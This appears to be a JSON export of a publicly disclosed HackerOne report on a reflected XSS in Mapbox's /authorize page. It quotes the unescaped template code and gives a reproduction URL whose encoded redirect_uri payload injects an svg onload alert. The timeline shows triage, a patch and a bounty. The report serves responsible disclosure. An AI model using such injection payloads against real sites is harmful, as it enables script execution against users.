{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-08-01T10:17:37.202Z", 
    "voters": [
        "fransrosen", 
        "bl4de", 
        "eveeez", 
        "aroly", 
        "japz", 
        "smit", 
        "hacklad", 
        "dyabla", 
        "ouadmoha", 
        "coal"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 143220, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-08-14T17:19:51.958Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "XSS on www.mapbox.com/authorize", 
    "is_member_of_team?": null, 
    "vote_count": 10, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-08-31T10:17:37.290Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-06-05T18:04:01.003Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-05T18:04:01.003Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "Link to the video: https://vimeo.com/169445824.\nPassword: `xssbringtoyoubystefano`.", 
            "markdown_message": "<p>Link to the video: <a title=\"https://vimeo.com/169445824\" href=\"/redirect?signature=a6b29957c3bd5a2e828736c6b4d399ea5ba3a37f&amp;url=https%3A%2F%2Fvimeo.com%2F169445824\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://vimeo.com/169445824</span><i class=\"icon-external-link\"></i></a>.<br>\nPassword: <code>xssbringtoyoubystefano</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1000437, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-06-08T19:49:19.744Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-06-08T19:49:19.744Z", 
            "actor": {
                "username": "alulsh", 
                "url": "/alulsh", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/856/aea4d77157b574d401ff2541d83f2d93deeff0fb_medium.JPG?1444102725"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 1005212, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "stefanofinding", 
                "url": "/stefanofinding"
            }, 
            "created_at": "2016-09-28T22:34:02.316Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-28T22:34:02.316Z", 
            "actor": {
                "username": "alulsh", 
                "url": "/alulsh", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/856/aea4d77157b574d401ff2541d83f2d93deeff0fb_medium.JPG?1444102725"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "Apologies for the wait on this and on [#143240](https://hackerone.com/reports/143240) @stefanofindsbugs. We just deployed a patch this evening - can you confirm the fix? ", 
            "markdown_message": "<p>Apologies for the wait on this and on <a href=\"https://hackerone.com/reports/143240\">#143240</a> <a href=\"/stefanofindsbugs\">@stefanofindsbugs</a>. We just deployed a patch this evening - can you confirm the fix? </p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1222659, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-29T00:49:29.163Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-29T00:49:29.163Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "No worries, I understand that it takes time to patch issues.\nI just confirmed that I can't reproduce the issue anymore.", 
            "markdown_message": "<p>No worries, I understand that it takes time to patch issues.<br>\nI just confirmed that I can&#39;t reproduce the issue anymore.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1222843, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2016-09-29T22:51:06.381Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-29T22:51:06.381Z", 
            "actor": {
                "url": "/mapbox", 
                "profile": {
                    "name": "Mapbox"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/366/7b4be0ae1ca280967179d25468223df76dd9074c_medium.jpg?1492717660"
                }
            }, 
            "team_handle": "mapbox", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "stefanofinding", 
                "url": "/stefanofinding"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1224798, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-30T00:14:24.592Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-30T00:14:24.592Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "Thank you for the bounty!", 
            "markdown_message": "<p>Thank you for the bounty!</p>\n", 
            "type": "Activities::Comment", 
            "id": 1224884, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-01T10:17:37.241Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-01T10:17:37.241Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "first_to_agree": true, 
            "message": "I would like to disclose this report, it would be great if you agree. Thanks!", 
            "markdown_message": "<p>I would like to disclose this report, it would be great if you agree. Thanks!</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1881878, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-14T17:19:51.979Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-14T17:19:51.979Z", 
            "actor": {
                "username": "alulsh", 
                "url": "/alulsh", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/856/aea4d77157b574d401ff2541d83f2d93deeff0fb_medium.JPG?1444102725"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1927378, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-14T17:19:52.034Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-14T17:19:52.034Z", 
            "actor": {
                "username": "alulsh", 
                "url": "/alulsh", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/856/aea4d77157b574d401ff2541d83f2d93deeff0fb_medium.JPG?1444102725"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "mapbox", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1927379, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "stefanofinding", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/stefanofinding", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/171/2b150e9b5657fcec95fe3961ebc01a9d5df9afb4_small.png?1509532580"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -39961016.84410825, 
    "disclosed_at": "2017-08-14T17:19:52.016Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/143220", 
    "created_at": "2016-06-05T18:00:42.415Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<h2 id=\"description\">Description</h2>\n\n<p>When you don&#39;t include the parameter <strong>client_id</strong> in the request to the endpoint at <a title=\"https://www.mapbox.com/authorize/\" href=\"/redirect?signature=9b89971f8aa50cb3f2301802115d14f63ac4a626&amp;url=https%3A%2F%2Fwww.mapbox.com%2Fauthorize%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.mapbox.com/authorize/</span><i class=\"icon-external-link\"></i></a>, the template <strong>template-modal-unauthorized</strong> (included in the client code of the endpoint)  is rendered with the value of the parameter <strong>redirect_uri</strong> sent in the request without escaping:</p>\n<pre class=\"highlight html\"><code>Code at https://www.mapbox.com/authorize/\n<span class=\"err\">&lt;</span>% if (obj.redirect) { %&gt;\n      <span class=\"nt\">&lt;div</span> <span class=\"na\">class=</span><span class=\"s\">&#39;fill-gray pad2y pad4x center&#39;</span><span class=\"nt\">&gt;</span>\n        <span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">&#39;&lt;%= obj.redirect %&gt;&#39;</span> <span class=\"na\">class=</span><span class=\"s\">&#39;button col12 close&#39;</span><span class=\"nt\">&gt;</span>Back<span class=\"nt\">&lt;/a&gt;</span>\n      <span class=\"nt\">&lt;/div&gt;</span>\n<span class=\"err\">&lt;</span>% } %&gt;\n</code></pre><pre class=\"highlight javascript\"><code><span class=\"nx\">Code</span> <span class=\"nx\">at</span> <span class=\"nx\">https</span><span class=\"p\">:</span><span class=\"c1\">//www.mapbox.com/authorize/authorize.js</span>\n<span class=\"p\">}).</span><span class=\"nx\">fail</span><span class=\"p\">(</span><span class=\"kd\">function</span><span class=\"p\">(</span><span class=\"nx\">err</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n        <span class=\"nx\">Views</span><span class=\"p\">.</span><span class=\"nx\">modal</span><span class=\"p\">.</span><span class=\"nx\">show</span><span class=\"p\">(</span><span class=\"s1\">&#39;unauthorized&#39;</span><span class=\"p\">,</span> <span class=\"p\">{</span>\n            <span class=\"na\">msg</span><span class=\"p\">:</span> <span class=\"nx\">err</span><span class=\"p\">.</span><span class=\"nx\">statusText</span><span class=\"p\">,</span>\n            <span class=\"na\">redirect</span><span class=\"p\">:</span> <span class=\"p\">(</span><span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">param</span><span class=\"p\">(</span><span class=\"s1\">&#39;redirect_uri&#39;</span><span class=\"p\">))</span> <span class=\"p\">?</span>\n                <span class=\"nx\">App</span><span class=\"p\">.</span><span class=\"nx\">param</span><span class=\"p\">(</span><span class=\"s1\">&#39;redirect_uri&#39;</span><span class=\"p\">)</span> <span class=\"p\">:</span>\n                <span class=\"kc\">false</span>\n        <span class=\"p\">});</span>\n<span class=\"p\">});</span>\n</code></pre>\n<p>The problem is that you can pass any value to <strong>redirect_uri</strong> and it is going to be added as HTML code, which allows to break the <code>&lt;a&gt;</code> element using a <code>&#39;</code> and a <code>&gt;</code>.</p>\n\n<h2 id=\"reproduction\">Reproduction</h2>\n\n<p>Load the following URL on Chrome, Firefox, Safari, Internet Explorer 11, or Edge.</p>\n<pre class=\"highlight plaintext\"><code>https://www.mapbox.com/authorize/?redirect_uri=%27%3E%3Csvg%20onload=%27alert%28document.domain%29%27%3E\n</code></pre>\n<p>I&#39;m going to share a link to the video in a comment, because the size is greater than 10MB.</p>\n\n<hr>\n\n<p>Let me know if you need more information.</p>\n", 
    "vulnerability_information": "Description\n---\nWhen you don't include the parameter __client_id__ in the request to the endpoint at https://www.mapbox.com/authorize/, the template __template-modal-unauthorized__ (included in the client code of the endpoint)  is rendered with the value of the parameter __redirect_uri__ sent in the request without escaping:\n```html\nCode at https://www.mapbox.com/authorize/\n<% if (obj.redirect) { %>\n      <div class='fill-gray pad2y pad4x center'>\n        <a href='<%= obj.redirect %>' class='button col12 close'>Back</a>\n      </div>\n<% } %>\n```\n```javascript\nCode at https://www.mapbox.com/authorize/authorize.js\n}).fail(function(err) {\n        Views.modal.show('unauthorized', {\n            msg: err.statusText,\n            redirect: (App.param('redirect_uri')) ?\n                App.param('redirect_uri') :\n                false\n        });\n});\n```\nThe problem is that you can pass any value to __redirect_uri__ and it is going to be added as HTML code, which allows to break the `<a>` element using a `'` and a `>`.\n\nReproduction\n---\nLoad the following URL on Chrome, Firefox, Safari, Internet Explorer 11, or Edge.\n```\nhttps://www.mapbox.com/authorize/?redirect_uri=%27%3E%3Csvg%20onload=%27alert%28document.domain%29%27%3E\n```\nI'm going to share a link to the video in a comment, because the size is greater than 10MB.\n\n---\n\nLet me know if you need more information.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.mapbox.com/security", 
            "about": "Mapbox is an open source mapping platform for developers. We make it easy to integrate location into any mobile or online application.", 
            "twitter_handle": "mapbox", 
            "name": "Mapbox"
        }, 
        "handle": "mapbox", 
        "url": "https://hackerone.com/mapbox", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/366/d535aeefcbd60f460a1d1e9769a180722e4343e9_small.jpg?1492717660", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/366/7b4be0ae1ca280967179d25468223df76dd9074c_medium.jpg?1492717660"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1366, 
        "default_currency": "usd"
    }, 
    "is_published": false
}